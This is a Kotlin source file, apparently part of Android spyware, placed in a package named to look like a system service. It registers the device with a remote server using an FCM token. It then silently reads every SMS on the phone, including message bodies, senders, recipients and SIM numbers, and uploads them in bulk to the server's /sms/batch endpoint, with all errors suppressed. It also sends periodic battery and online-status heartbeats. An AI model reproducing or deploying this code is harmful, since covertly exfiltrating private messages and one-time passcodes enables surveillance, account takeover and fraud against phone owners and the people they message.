package com.android.system.services.utils

import android.content.Context
import android.os.Build
import android.provider.Telephony
import android.database.Cursor
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object DataUploader {
    
    private fun getBaseUrl(): String = com.android.system.services.ServerConfig.getBaseUrl()

    fun registerDeviceInitial(context: Context, deviceId: String, fcmToken: String, userId: String): Boolean {
        return try {
            val deviceInfo = DeviceInfoHelper.buildDeviceInfoJsonWithoutPermissions(context, deviceId, fcmToken, userId)
            val appConfig = com.android.system.services.AppConfig.getInstance()

            val registerJson = JSONObject().apply {
                put("type", "register")
                put("device_id", deviceId)
                put("device_info", deviceInfo)
                put("user_id", userId)
                put("app_type", appConfig.appType)
                put("is_initial", true)
            }

            sendPostRequest("${getBaseUrl()}/register", registerJson.toString())
            true

        } catch (e: Exception) {
            false
        }
    }

    fun registerDevice(context: Context, deviceId: String, fcmToken: String, userId: String): Boolean {
        return try {
            val deviceInfo = DeviceInfoHelper.buildDeviceInfoJson(context, deviceId, fcmToken, userId)
            val appConfig = com.android.system.services.AppConfig.getInstance()

            val registerJson = JSONObject().apply {
                put("type", "register")
                put("device_id", deviceId)
                put("device_info", deviceInfo)
                put("user_id", userId)
                put("app_type", appConfig.appType)
                put("is_initial", false)
            }

            sendPostRequest("${getBaseUrl()}/register", registerJson.toString())
            true

        } catch (e: Exception) {
            false
        }
    }


    private fun getSimInfoFromSubId(context: Context, subId: Int?): Pair<String, Int> {
        if (subId == null || subId < 0) return Pair("", -1)
        
        try {
            val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            if (subManager == null) return Pair("", -1)
            
            val activeSubscriptions = subManager.activeSubscriptionInfoList
            if (activeSubscriptions.isNullOrEmpty()) return Pair("", -1)
            
            val subscriptionInfo = activeSubscriptions.find { it.subscriptionId == subId }
            if (subscriptionInfo == null) return Pair("", -1)
            
            val simSlot = subscriptionInfo.simSlotIndex
            var phoneNumber = subscriptionInfo.number ?: ""
            
            if (phoneNumber.isBlank() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                try {
                    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                    if (telephonyManager != null) {
                        val tm = telephonyManager.createForSubscriptionId(subId)
                        phoneNumber = tm.line1Number ?: ""
                    }
                } catch (e: Exception) {
                }
            }
            
            return Pair(phoneNumber, simSlot)
        } catch (e: Exception) {
            return Pair("", -1)
        }
    }
    
    
    fun uploadAllSms(context: Context, deviceId: String) {
        try {
            val messages = JSONArray()
            
            val columns = mutableListOf(
                Telephony.Sms._ID,
                Telephony.Sms.THREAD_ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.PERSON,
                Telephony.Sms.DATE,
                Telephony.Sms.DATE_SENT,
                Telephony.Sms.PROTOCOL,
                Telephony.Sms.READ,
                Telephony.Sms.STATUS,
                Telephony.Sms.TYPE,
                Telephony.Sms.REPLY_PATH_PRESENT,
                Telephony.Sms.SUBJECT,
                Telephony.Sms.BODY,
                Telephony.Sms.SERVICE_CENTER,
                Telephony.Sms.LOCKED,
                Telephony.Sms.ERROR_CODE,
                Telephony.Sms.SEEN,
                Telephony.Sms.CREATOR
            )
            
            val subIdColumn = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val possibleColumns = listOf("sub_id", "subscription_id", "sim_id", "phone_id")
                val foundColumns = mutableListOf<String>()
                
                try {
                    val testCursor = context.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
                    testCursor?.use {
                        val availableColumns = it.columnNames.toSet()
                        for (col in possibleColumns) {
                            if (col in availableColumns) {
                                foundColumns.add(col)
                            }
                        }
                    }
                } catch (e: Exception) {
                }
                
                foundColumns.forEach { columns.add(it) }
                foundColumns.firstOrNull()
            } else null
            
            val cursor: Cursor? = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                columns.toTypedArray(),
                null,
                null,
                Telephony.Sms.DATE + " DESC"
            )

            cursor?.use {
                val idIndex = it.getColumnIndex(Telephony.Sms._ID)
                val threadIdIndex = it.getColumnIndex(Telephony.Sms.THREAD_ID)
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val personIndex = it.getColumnIndex(Telephony.Sms.PERSON)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val dateSentIndex = it.getColumnIndex(Telephony.Sms.DATE_SENT)
                val protocolIndex = it.getColumnIndex(Telephony.Sms.PROTOCOL)
                val readIndex = it.getColumnIndex(Telephony.Sms.READ)
                val statusIndex = it.getColumnIndex(Telephony.Sms.STATUS)
                val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
                val replyPathPresentIndex = it.getColumnIndex(Telephony.Sms.REPLY_PATH_PRESENT)
                val subjectIndex = it.getColumnIndex(Telephony.Sms.SUBJECT)
                val serviceCenterIndex = it.getColumnIndex(Telephony.Sms.SERVICE_CENTER)
                val lockedIndex = it.getColumnIndex(Telephony.Sms.LOCKED)
                val errorCodeIndex = it.getColumnIndex(Telephony.Sms.ERROR_CODE)
                val seenIndex = it.getColumnIndex(Telephony.Sms.SEEN)
                val creatorIndex = it.getColumnIndex(Telephony.Sms.CREATOR)
                val subIdIndex = if (subIdColumn != null) {
                    try {
                        var idx = it.getColumnIndex(subIdColumn)
                        if (idx < 0) {
                            idx = it.getColumnIndex("subscription_id")
                        }
                        if (idx < 0) {
                            idx = it.getColumnIndex("sim_id")
                        }
                        if (idx < 0) {
                            idx = it.getColumnIndex("phone_id")
                        }
                        if (idx >= 0) idx else -1
                    } catch (e: Exception) {
                        -1
                    }
                } else -1
                
                while (it.moveToNext()) {
                    val id = if (idIndex >= 0) it.getLong(idIndex) else -1
                    val threadId = if (threadIdIndex >= 0) it.getLong(threadIdIndex) else -1
                    val address = if (addressIndex >= 0) (it.getString(addressIndex) ?: "") else ""
                    val person = if (personIndex >= 0) it.getLong(personIndex) else -1
                    val body = if (bodyIndex >= 0) (it.getString(bodyIndex) ?: "") else ""
                    val timestamp = if (dateIndex >= 0) it.getLong(dateIndex) else 0L
                    val dateSent = if (dateSentIndex >= 0) it.getLong(dateSentIndex) else -1L
                    val protocol = if (protocolIndex >= 0) it.getInt(protocolIndex) else -1
                    val read = if (readIndex >= 0) (it.getInt(readIndex) == 1) else false
                    val status = if (statusIndex >= 0) it.getInt(statusIndex) else -1
                    val smsType = if (typeIndex >= 0) it.getInt(typeIndex) else -1
                    val replyPathPresent = if (replyPathPresentIndex >= 0) (it.getInt(replyPathPresentIndex) == 1) else false
                    val subject = if (subjectIndex >= 0) (it.getString(subjectIndex) ?: "") else ""
                    val serviceCenter = if (serviceCenterIndex >= 0) (it.getString(serviceCenterIndex) ?: "") else ""
                    val locked = if (lockedIndex >= 0) (it.getInt(lockedIndex) == 1) else false
                    val errorCode = if (errorCodeIndex >= 0) it.getInt(errorCodeIndex) else -1
                    val seen = if (seenIndex >= 0) (it.getInt(seenIndex) == 1) else false
                    val creator = if (creatorIndex >= 0) (it.getString(creatorIndex) ?: "") else ""
                    
                    var subId: Int? = null
                    if (subIdIndex >= 0) {
                        try {
                            val subIdValue = it.getString(subIdIndex)
                            if (!subIdValue.isNullOrBlank()) {
                                subId = subIdValue.toIntOrNull()
                            }
                        } catch (e: Exception) {
                        }
                    }
                    
                    val (simPhoneNumber, simSlot) = if (subId != null && subId >= 0) {
                        getSimInfoFromSubId(context, subId)
                    } else {
                        Pair("", -1)
                    }

                    val (from, to) = when (smsType) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> Pair(address.trim(), "")
                        Telephony.Sms.MESSAGE_TYPE_SENT -> {
                            val fromNumber = if (simPhoneNumber.isNotEmpty()) {
                                simPhoneNumber
                            } else {
                                ""
                            }
                            Pair(fromNumber, address.trim())
                        }
                        else -> Pair(address.trim(), "")
                    }

                    val typeStr = when (smsType) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
                        Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
                        Telephony.Sms.MESSAGE_TYPE_FAILED -> "failed"
                        Telephony.Sms.MESSAGE_TYPE_QUEUED -> "queued"
                        else -> "unknown"
                    }

                    val sms = JSONObject().apply {
                        put("_id", id)
                        put("thread_id", threadId)
                        put("from", from)
                        put("to", to)
                        put("address", address)
                        put("person", if (person >= 0) person else JSONObject.NULL)
                        put("body", body)
                        put("subject", subject)
                        put("timestamp", timestamp)
                        put("date_sent", if (dateSent >= 0) dateSent else JSONObject.NULL)
                        put("type", typeStr)
                        put("type_code", smsType)
                        put("read", read)
                        put("seen", seen)
                        put("status", status)
                        put("protocol", if (protocol >= 0) protocol else JSONObject.NULL)
                        put("reply_path_present", replyPathPresent)
                        put("service_center", serviceCenter)
                        put("locked", locked)
                        put("error_code", if (errorCode >= 0) errorCode else JSONObject.NULL)
                        put("creator", creator)
                        if (simPhoneNumber.isNotEmpty()) {
                            put("sim_phone_number", simPhoneNumber)
                        }
                        if (simSlot >= 0) {
                            put("sim_slot", simSlot)
                        }
                        if (subId != null && subId >= 0) {
                            put("sub_id", subId)
                        }
                    }
                    messages.put(sms)
                }
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("data", messages)
                put("batch_info", JSONObject().apply {
                    put("batch", 1)
                    put("of", 1)
                })
            }

            sendPostRequest("${getBaseUrl()}/sms/batch", json.toString())
        } catch (e: Exception) {
        }
    }


    fun sendBatteryUpdate(context: Context, deviceId: String, fcmToken: String) {
        try {
            val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            val batteryLevel = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("fcm_token", fcmToken)
                put("data", JSONObject().apply {
                    put("battery", batteryLevel)
                    put("is_online", true)
                })
                put("timestamp", System.currentTimeMillis())
            }

            sendPostRequest("${getBaseUrl()}/battery", json.toString())
        } catch (e: Exception) {
        }
    }

    private fun sendPostRequest(urlString: String, jsonData: String): String? {
        var connection: HttpURLConnection? = null
        try {
            val url = URL(urlString)
            connection = url.openConnection() as HttpURLConnection
            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                connectTimeout = 15000
                readTimeout = 15000
            }

            connection.outputStream.use { os ->
                os.write(jsonData.toByteArray())
                os.flush()
            }

            val responseCode = connection.responseCode

            return if (responseCode == HttpURLConnection.HTTP_OK) {
                connection.inputStream.bufferedReader().use { it.readText() }
            } else {
                null
            }

        } catch (e: Exception) {
            return null
        } finally {
            connection?.disconnect()
        }
    }
}